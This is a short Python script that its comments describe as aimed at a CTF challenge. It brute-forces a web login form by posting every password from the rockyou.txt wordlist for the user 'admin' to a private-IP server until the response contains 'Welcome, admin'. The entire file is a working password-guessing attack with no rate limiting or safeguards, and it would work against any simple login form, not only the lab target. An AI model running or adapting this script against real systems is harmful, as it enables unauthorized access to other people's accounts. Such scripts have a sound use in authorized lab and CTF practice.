import requests

# URL of the CTF challenge
url = "http://10.30.6.240:8080/"

# Admin username (assumed)
username = "admin"  # Replace with actual username if needed

# Path to the wordlist (Make sure you have this wordlist file, e.g., rockyou.txt)
wordlist_file = "rockyou.txt"  # Update with your actual path to the wordlist file

# Create a session to maintain cookies and session data
session = requests.Session()

# Step 1: Define the login URL (assuming login form is on the root URL)
login_url = url  # Adjust if login URL is different

# Step 2: Read the wordlist and start brute-forcing
with open(wordlist_file, "r", encoding="latin-1") as file:
    for line in file:
        password = line.strip()  # Remove any extra whitespace or newline characters
        print(f"Trying password: {password}")

        # Prepare login data
        login_data = {
            "username": username,
            "password": password
        }

        # Step 3: Send POST request with login data
        response = session.post(login_url, data=login_data)

        # Step 4: Check if login was successful
        if response.status_code == 200 and "Welcome, admin" in response.text:
            print(f"Login successful with password: {password}")
            break
        else:
            print(f"Login failed with password: {password}")

# Step 5: Close the session
session.close()
